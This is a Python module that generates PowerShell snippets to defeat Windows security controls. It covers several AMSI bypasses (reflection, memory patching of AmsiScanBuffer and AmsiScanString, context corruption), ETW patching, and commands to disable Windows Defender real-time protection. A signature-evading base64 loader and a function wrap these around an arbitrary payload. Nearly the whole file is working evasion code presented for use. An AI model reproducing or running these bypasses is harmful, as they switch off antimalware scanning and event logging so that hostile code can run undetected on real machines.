"""
AMSI & ETW Bypass Module
Bypass Windows security mechanisms for PowerShell/C# execution
"""
import base64
import random
import string
from typing import Optional


class AMSIBypass:
    """
    AMSI (Antimalware Scan Interface) bypass techniques.
    
    Techniques:
    - Memory patching (amsiScanBuffer)
    - AmsiContext corruption
    - CLR hooking
    - PowerShell reflection
    """
    
    @staticmethod
    def get_reflection_bypass() -> str:
        """
        PowerShell AMSI bypass using reflection.
        Patches amsiInitFailed to true.
        """
        # Obfuscated variable names
        ctx = ''.join(random.choices(string.ascii_lowercase, k=8))
        
        bypass = f'''
# AMSI Bypass via Reflection
$a=[Ref].Assembly.GetTypes()|?{{$_.Name -like "*iUtils"}}
$b=$a.GetFields('NonPublic,Static')|?{{$_.Name -like "*Context"}}
[IntPtr]${ctx}=$b.GetValue($null)
[Int32[]]$c=@(0)
[System.Runtime.InteropServices.Marshal]::Copy($c,0,${ctx},1)
'''
        return bypass.strip()
    
    @staticmethod
    def get_memory_patch_bypass() -> str:
        """
        PowerShell AMSI bypass via memory patching.
        Patches amsiScanBuffer to return clean result.
        """
        bypass = '''
# AMSI Memory Patch Bypass
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
'''
        return bypass.strip()
    
    @staticmethod
    def get_amsi_scanstring_patch() -> str:
        """
        Patch AmsiScanString directly for string-based scanning bypass.
        """
        bypass = '''
# AmsiScanString Patch
$lib = [System.Runtime.InteropServices.Marshal]::LoadHGlobal([System.Text.Encoding]::ASCII.GetBytes("amsi.dll"))
$ptr = Add-Type -MemberDefinition '[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);' -Name a -PassThru
$addr = $ptr::GetProcAddress([System.IntPtr]([System.Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Runtime.InteropServices.Marshal')::("GetHINSTANCE")|%{$_.Invoke($null,@([System.Reflection.Assembly]::LoadWithPartialName("System.Management.Automation").GetType("System.Management.Automation.AmsiUtils")))}), "AmsiScanString")
if($addr -ne [IntPtr]::Zero) {
    $patch = [byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 6)
}
'''
        return bypass.strip()
    
    @staticmethod
    def get_context_corruption_bypass() -> str:
        """
        Corrupt AMSI context to disable scanning.
        """
        bypass = '''
# AMSI Context Corruption
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext",[Reflection.BindingFlags]"NonPublic,Static").SetValue($null,$mem)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession",[Reflection.BindingFlags]"NonPublic,Static").SetValue($null,$null)
'''
        return bypass.strip()
    
    @staticmethod
    def get_clr_bypass() -> str:
        """
        Bypass via CLR hooking - works for .NET assemblies.
        """
        bypass = '''
# CLR-based AMSI Bypass
[Runtime.InteropServices.Marshal]::WriteByte([Ref].Assembly.GetType(('System.Management.Automation.Am'+'siUtils')).GetField(('am'+'siCo'+'ntext'),[Reflection.BindingFlags]('NonPublic,Static')).GetValue($null),0x5)
'''
        return bypass.strip()


class ETWBypass:
    """
    ETW (Event Tracing for Windows) bypass techniques.
    Disables .NET CLR ETW to prevent logging.
    """
    
    @staticmethod
    def get_etw_patch() -> str:
        """
        Patch EtwEventWrite to disable ETW logging.
        """
        bypass = '''
# ETW Bypass - Patch EtwEventWrite
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32

$ntdll = [Win32]::LoadLibrary("ntdll.dll")
$etwAddr = [Win32]::GetProcAddress($ntdll, "EtwEventWrite")
$oldProtect = 0
[Win32]::VirtualProtect($etwAddr, [uint32]4, 0x40, [ref]$oldProtect)
# xor eax,eax; ret
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0x33, 0xC0, 0xC3), 0, $etwAddr, 3)
[Win32]::VirtualProtect($etwAddr, [uint32]4, $oldProtect, [ref]$oldProtect)
'''
        return bypass.strip()
    
    @staticmethod  
    def get_etw_provider_bypass() -> str:
        """
        Disable specific ETW providers.
        """
        bypass = '''
# Disable .NET ETW Provider
$Assembly = [Reflection.Assembly]::LoadWithPartialName('System.Core')
$Field = $Assembly.GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance')
$Providers = $Assembly.GetType('System.Diagnostics.Eventing.EventProvider').GetField('s_providers','NonPublic,Static').GetValue($null)
foreach ($p in $Providers) {
    $Field.SetValue($p.Target, 0)
}
'''
        return bypass.strip()


class DefenderBypass:
    """
    Windows Defender specific bypasses.
    """
    
    @staticmethod
    def get_defender_exclusion_enum() -> str:
        """
        Enumerate Defender exclusion paths (requires admin).
        """
        bypass = '''
# Enumerate Defender Exclusions (Admin Required)
$exclusions = Get-MpPreference | Select-Object -Property ExclusionPath, ExclusionExtension, ExclusionProcess
$exclusions | Format-List
'''
        return bypass.strip()
    
    @staticmethod
    def get_defender_disable() -> str:
        """
        Disable Defender real-time protection (requires admin).
        WARNING: Very noisy and logged!
        """
        bypass = '''
# Disable Defender Real-Time Protection (ADMIN REQUIRED - VERY NOISY)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -SubmitSamplesConsent 2
# WARNING: These actions are logged and will trigger alerts!
'''
        return bypass.strip()


def get_combined_bypass() -> str:
    """Get combined AMSI + ETW bypass for maximum evasion."""
    bypass = f'''
# Combined AMSI + ETW Bypass
# Step 1: ETW Bypass (disable logging first)
{ETWBypass.get_etw_patch()}

# Step 2: AMSI Bypass
{AMSIBypass.get_reflection_bypass()}

Write-Host "[+] Bypasses applied successfully"
'''
    return bypass


def get_obfuscated_bypass() -> str:
    """
    Get heavily obfuscated bypass.
    Uses string concatenation and encoding to evade signatures.
    """
    # Base64 encode the bypass
    base_bypass = AMSIBypass.get_memory_patch_bypass()
    encoded = base64.b64encode(base_bypass.encode('utf-16le')).decode()
    
    bypass = f'''
# Obfuscated Bypass
$enc = "{encoded}"
$dec = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($enc))
Invoke-Expression $dec
'''
    return bypass


def generate_bypass_loader(payload: str, technique: str = "reflection") -> str:
    """
    Generate bypass loader that runs arbitrary PowerShell payload.
    
    Args:
        payload: PowerShell code to execute after bypass
        technique: Bypass technique to use
    """
    techniques = {
        "reflection": AMSIBypass.get_reflection_bypass(),
        "memory_patch": AMSIBypass.get_memory_patch_bypass(),
        "context": AMSIBypass.get_context_corruption_bypass(),
        "clr": AMSIBypass.get_clr_bypass(),
    }
    
    bypass = techniques.get(technique, techniques["reflection"])
    
    loader = f'''
# AMSI Bypass Loader
try {{
{bypass}
    Write-Host "[+] AMSI bypassed"
}} catch {{
    Write-Host "[-] AMSI bypass failed: $_"
}}

# ETW Bypass
try {{
{ETWBypass.get_etw_patch()}
    Write-Host "[+] ETW bypassed"
}} catch {{
    Write-Host "[-] ETW bypass failed"
}}

# Execute payload
{payload}
'''
    return loader
